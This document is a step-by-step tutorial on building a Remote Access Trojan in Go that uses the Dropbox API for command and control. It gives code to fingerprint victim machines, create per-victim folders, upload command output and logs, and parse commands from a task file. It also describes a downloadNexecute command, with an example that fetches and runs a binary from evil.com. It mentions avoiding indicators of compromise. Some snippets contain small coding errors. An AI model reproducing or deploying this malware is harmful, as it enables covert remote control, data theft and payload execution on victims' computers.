# Introduction

For this tutorial, we will be abusing the [Dropbox API](https://www.dropbox.com/developers/documentation/http/documentation) in order to build a RAT (Remote Access Trojan). Dropbox also provides a means to test different API calls and get code samples from Python which is available [here](https://dropbox.github.io/dropbox-api-v2-explorer/#)

A RATs functionality is simple: issue commands and receive the result of those commands. So we just need a way to communicate with the victim machine, which can be done via a task file that is stored on Dropbox and the victim machine will download and the victim machine will parse the task file for commands. Then the victim machine would upload the result of the executed command to a Dropbox file. Seems simple enough, right? Let's get into the code.

## Initial Infection

If we issue a command such as to upload all files with a specific extension, we'd need a place to receive it. But what if 2 victim machines have a generic name for the same file type (EX: Let's say 2 victim machines have a .docx file which we want to grab which is generically named as "Document.docx")? They'd either be overwritten or the upload would simply result in the API returning an error. This means we need a unique directory for every infected victim machine which is where they'd return any requested data.

We can create directories by using [create_folder_v2](https://dropbox.github.io/dropbox-api-v2-explorer/#files_create_folder_v2) in Dropbox's API. So we can now create a unique folder for every infected victim when the malware is ran. I chose to base the directory name off the SHA1 hash of the victim's hostname, their username, and their mac address, but you can choose any static element on a machine. This SHA1 hash will also be the machine's unique identifier when issuing commands. The following code will do everything I just described.

```
package main
import (
    "os/exec"
    "net/http"
    "encoding/hex"
    "crypto/sha1"
    "encoding/json"
    "bytes"
    "io/ioutil"
)

var (
    token = "longTokenString"
    client = &http.Client{}
    UUID string
)

func initInfection() {
    fmt.Println("Generating unique identifier for machine...")
    hostname, _ := exec.Command("cmd.exe /C", "hostname").Output()
    username, _ := exec.Command("cmd.exe /C", "whoami").Output()
    macAddress, _ := exec.Command("cmd.exe /C", "getmac").Output()
    uniqueID := string(hostname) + "-" + string(username) + "-" + string(macAddress)
    hashGen := sha1.New()
    hashGen.write([]byte(uniqueID))
    UUID = hex.EncodeToString(hashGen.Sum(nil))
    fmt.Printf("Machine's unique identifier is: %s...\n", UUID)
    fmt.Println("Creating unique folder...")
    
    uniqueUserFolder := "/" + UUID
    var bearer = "Bearer " + token
    dataParam1 := []interface{} {uniqueUserFolder}
    dataParam2 := []interface{} {true, false}
    requestParams, _ := json.marshal(map[string]interface{}) {
        "path": dataParam1[0],
        "autorename": dataParam2[1],
    })
    request, _ := http.NewRequest("POST", "https://api.dropboxapi.com/2/files/create_folder_v2", bytes.NewBuffer(requestParams))
    request.Header.Add("Authorization", bearer)
    request.Header.Add("Content-Type", "application/json")
    response, _ := client.Do(request)
    responseBod, _ := ioutil.ReadAll(response.Body)
    fmt.Println(string(responseBod))
    response.Body.Close()
    return
}
```

This would be one of the first functions to run in the malware, but we should also implement a function to check if the unique victim folder exists before we create it, just so it doesn't attempt to create it everytime the malware is ran. All we'd need to do is make an API call to [list_folder](https://dropbox.github.io/dropbox-api-v2-explorer/#files_list_folder) which would return the list of files & folders that we have in Dropbox. Then we'd iterate through this list and compare each folder name to the unique identifier which is assigned to the *UUID* variable. Since the API returns json encoded data, we'd need to unravel this in order to properly iterate through the data.

So if the folder exists, we return true. Otherwise, we assign the value 0 to a variable named *exists*, then after we've iterated through all the elements in the list, we check the value of the *exists* variable: if it's 0 (meaning the folder doesn't exist), then we return false which means we will create the victim's unique folder on Dropbox. And if true is returned, then we simply skip the process of creating the unique folder as it already exists.

```
func folderExists(dbFolderName string) bool {
	var bearer = "Bearer " + token
	fmt.Printf("Folder name to search: %s:\n", dbFolderName)
	dataParamBool := []interface{} {true, false}
	requestParams, _ := json.Marshal(map[string]interface{} {
		"path": "",
		"recursive": dataParamBool[0],
		"include_deleted": dataParamBool[1],
		"include_has_explicit_shared_members": dataParamBool[1],
		"include_mounted_folders": dataParamBool[0],
		"include_non_downloadable_files": dataParamBool[0],
	})
	request, _ := http.NewRequest("POST", "https://api.dropboxapi.com/2/files/list_folder", bytes.NewBuffer(requestParams))
	request.Header.Add("Authorization", bearer)
	request.Header.Add("Content-Type", "application/json")
	response, _ := client.Do(request)
	respbody, _ := ioutil.ReadAll(response.Body)
	response.Body.Close()
	jmap := make(map[string]interface{})
	err := json.Unmarshal([]byte(string(respbody)), &jmap)
	if err != nil {
		fmt.Println(err)
	}
	exists := 0
	fileEntries := jmap["entries"].([]interface{})
	for i:=0; i<=len(fileEntries)-1; i++ {
		fileEntry := fileEntries[i].(map[string]interface{})
		if fileEntry["name"].(string) == dbFolderName {
			fmt.Println("Folder exists!")
			return true
		} else {
			exists = 0
		}
	}
	if exists == 0 {
		fmt.Println("Folder doesn't exist!")
		return false
	} else {
		return true
	}
}

```

So adding the use of *folderExists()* to *initInfection()*, we'd get this:

```
func initInfection() {
	hostname, _ := exec.Command("cmd.exe", "/C", "hostname").Output()
	username, _ := exec.Command("cmd.exe", "/C", "whoami").Output()
	macAddress, _ := exec.Command("cmd.exe", "/C", "getmac").Output()
	uniqueID := string(hostname) + "-" + string(username) + "-" + string(macAddress)
	hashGen := sha1.New()
	hashGen.Write([]byte(beg))
	UUID = hex.EncodeToString(hashGen.Sum(nil))
	uniqueUserFolder := "/" + UUID
	if folderExists(UUID) {
		fmt.Println("Folder detected, skipping creation of unique victim folder...")
	} else {
		fmt.Println("Unique victim folder not created, creating one...")
		var bearer = "Bearer " + token
		dataParam1 := []interface{} {uniqueUserFolder}
		dataParam2 := []interface{} {true, false}	
		requestParams, _ := json.Marshal(map[string]interface{} {
			"path": dataParam1[0],
			"autorename": dataParam2[1],
		})
		request, _ := http.NewRequest("POST", "https://api.dropboxapi.com/2/files/create_folder_v2", bytes.NewBuffer(requestParams))
		request.Header.Add("Authorization", bearer)
		request.Header.Add("Content-Type", "application/json")
		response, _ := client.Do(request)
		respbody, _ := ioutil.ReadAll(response.Body)
		fmt.Println(string(respbody))
		resp.Body.Close()
	}
	logFileWriter(userFolder, "Victim check in")
	return
}
```
* Note: we also added in a check-in functionality using the *logFileWriter* which is explained later on in the Error Handling section. 

## Uploading Files

Now if we want to upload the result of executed commands, we need a way to upload files. My desired way of uploading the results would be to write the result to a local file, then upload that local file to the victim's unique Dropbox folder. We'll be using the [upload API call](https://dropbox.github.io/dropbox-api-v2-explorer/#files_upload) in order to do so. Our function takes 2 inputs: **the local path** of the desired file to upload and **the external path** which would be the Dropbox path to upload the local file to.

```
func rawFileUpload(localFilePath string, externalDBFilePath string) {
	var bearer = "Bearer " + token
	uploadParamBool := []interface{} {true, false}
	uploadParams, _ := json.Marshal(map[string]interface{} {
		"path": externalDBFilePath,
		"mode": "overwrite",
		"autorename": uploadParamBool[0],
		"mute": uploadParamBool[1],
		"strict_conflict": uploadParamBool[1],
	})
	fileData, _ := ioutil.ReadFile(localFilePath)
	request, _ := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/upload", bytes.NewBuffer(fileData))
	request.Header.Add("Authorization", bearer)
	request.Header.Add("Dropbox-API-Arg", string(uploadParams))
	request.Header.Add("Content-Type", "application/octet-stream")
	response, _ := client.Do(request)
	respbody, _ := ioutil.ReadAll(response.Body)
	fmt.Println(string(respbody))
	resp.Body.Close()
	return
}
```

Now onto the function that we'll use to upload the result of commands. All we need to do is take one input: the result of the executed command and write it to a file, then upload the file using our newly created *rawFileUpload* function. The filename that we drop onto the system will simply be a hash of the data that we're writing to the file in order to avoid hardcoding a filename which could potentially be used as an IOC. I also added a timestamp to the Dropbox filename:

```
func cmdResultUploader(result string) {
	t := time.Now()
	localFileNameGen := sha1.New()
	dbFullPath := "/" + UUID + "/" + "results-" + t.Format("01-02-2006--15:04") + ".txt"
	localFileNameGen.Write([]byte(result))
	localFullPath := os.Getenv("USERPROFILE") + "\\" + hex.EncodeToString(localFileNameGen.Sum(nil))
	f, _ := os.Create(localFullPath)
	f.WriteString(result)
	f.Close()
	rawFileUpload(localFullPath, dbFullPath)
	_ = os.Remove(localFullPath)
	return
}
```

## Error Handling

Now if we run into errors when attempting to execute issued commands, such as not enough arguments being passed, we need to be able to notify the operator of the malware of the encountered issue. We can do this by keeping a log file in each victim's unique directory and writing the errors to this log file when they're encountered. The following code will also check to see if the log file exists & create it if it doesn't already exist in the victim's unique Dropbox folder:

```
func logFileWriter(dbFolder string, data string) {
	dbLogPath := dbFolder + "/" + logFileName
	fullLogPath := os.Getenv("USERPROFILE") + "\\" + logFileName
	if fileExists(dbFolder, logFileName) {
		fmt.Println("log file already exists. Downloading & writing new event to it...")
		respbody2 := downloadDBFile(dbLogPath)
		fmt.Println("Writing new events to log file...")
		t := time.Now()
		timestamp := t.String()
		f, _ := os.Create(fullLogPath)
		f.WriteString(string(respbody2))
		f.WriteString("[" + timestamp + "]" + "\t" + data + "\n")
		f.Close()
		fmt.Println("Uploading log file...")
		rawFileUpload(fullLogPath, dbLogPath)
		fmt.Println("log file uploaded! Removing log file from local system...")
		_ = os.Remove(fullLogPath)
		return
	} else {
		fmt.Println("log file not found. Creating one...")
		t := time.Now()
		timestamp := t.String()
		f, _ := os.Create(fullLogPath)
		f.WriteString("[" + timestamp + "]" + "\t" + data + "\n")
		f.Close()
		fmt.Println("uploading log file...")
		//reads content of log file & uploads the raw data to the dropbox api
		rawFileUpload(fullLogPath, dbLogPath)
		fmt.Println("log file uploaded! Removing log file from local system...")
		_ = os.Remove(fullLogPath)
		return
	}
}
```
The created log file will have a timestamp and information regarding the encountered event.

## Parsing Commands

In order to parse the issued commands, we have to download a file which can be done via the [download API call](https://dropbox.github.io/dropbox-api-v2-explorer/#files_download). Then we'd need to interpret different parts of the issued command such as: who the command is meant for and what the command is and if there are any additional arguments for the command. This can be done by simply adding in a separator for each section of the command, so the syntax would be like this: 

* `who the command is meant for+-the desired command+-optional arguments`
* EX: `everyone+-profile`



The only argument that would need to be pased to the *downloadDBFile* function is the Dropbox path of the file we wish to download, which is named *dbFileName*. In the case of issuing commands, the name of the task file which contains commands is named in the beginning of the code in the var() section. The location of the task file should be in the root folder of Dropbox.

```
func downloadDBFile(dbFilePath string) string {
	var dbFilePathPrefixed string
	if !strings.HasPrefix(dbFilePath, "/") {
		dbFilePathPrefixed = "/" + dbFilePath
		var bearer = "Bearer " + token
		downloadParams, _ := json.Marshal(map[string]string {
			"path": dbFilePathPrefixed,
		})
		request, _ := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/download", nil)
		request.Header.Add("Authorization", bearer)
		request.Header.Add("Dropbox-API-Arg", string(downloadParams))
		resp, _ := client.Do(request)
		respbody, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		return string(respbody)
	} else {
		var bearer = "Bearer " + token
		downloadParams, _ := json.Marshal(map[string]string {
			"path": dbFilePath,
		})
		request2, _ := http.NewRequest("POST", "https://content.dropboxapi.com/2/files/download", nil)
		request2.Header.Add("Authorization", bearer)
		request2.Header.Add("Dropbox-API-Arg", string(downloadParams))
		resp2, _ := client.Do(request2)
		respbody2, _ := ioutil.ReadAll(resp2.Body)
		resp2.Body.Close()
		return string(respbody2)
	}
}
```
Then after grabbing the data from the task file, we simply split it at the **+-** which is the separator, and interpret each piece one by one:

* The first piece being who the command is meant for. If it's issued to our unique identifier specifically or simple says "everyone"
* The second piece being the actual command
* The third piece is optional, it's any arguments meant for the command

There are also length checks to ensure the operator of the malware is providing enough arguments for commands. For example, if the operator only provides who the command is for and forgets to write the command, we will write this error to the log file and exit. Or if the operator fails to provide all arguments to a command such as the **downloadNexecute** command, we write this error to the log file & exit. This all occurs in the main() function, here's a snippet of what'

```
    cmd := downloadDBFile("tasks.txt")
	cmdNoNls := strings.Split(cmd, "\n")
	fmt.Printf("received cmd: %s\n", cmd)
	cmdSplit := strings.Split(cmdNoNls[0], "+-")
	uuidFullPath := "/" + UUID
	if len(cmdSplit) < 2 {
		logFileWriter(uuidFullPath, "Issued command has less than 2 parts. At minimum, it must have 2 parts: [who it's addressed to]+-[what the cmd is]. Please see the guide for list of available commands and their accompanying arguments.")
		return
	}
```

## Available Commands
The list of available commands is short. Listed here are the names & a short description of what they do:

1. GMac - Returns the MAC address of the machine
2. profile - Returns Windows version & architecture of the machine
3. location - Returns location info of the machine
4. downloadNexecute - Downloads a user-specified binary and executes it, then returns results of execution

### GMac
Requires no additional arguments. Simply specify who the command is for followed up by the word *GMac*. Example:

* `everyone+-GMac`

### profile

Requires no additional arguments. Simply specify who the command is for followed up by the word *profile*. Example:

* `everyone+-profile`


### location

Requires no additional arguments. Simply specify who the command is for followed up by the word *location*. Example:

* `everyone+-location`

### downloadNexecute

This function's purpose is as its name implies: Downloading a user specified file and executing it, then writing the output of the execution to a file on Dropbox. If any errors are encountered, they are written to the log file in the victim's unique folder. When calling this command, you need to give 3 arguments which include:

1. The link to the binary which you wish to download & execute
2. The filename to name the file when it's dropped on the machine
3. The environment variable of where to drop it (EX: APPDATA, USERPROFILE, TEMP)

An example of what calling this command would look like is:

* `everyone+-downloadNexecute+-https://evil.com/bin.exe+-defaultFile.exe+-USERPROFILE`
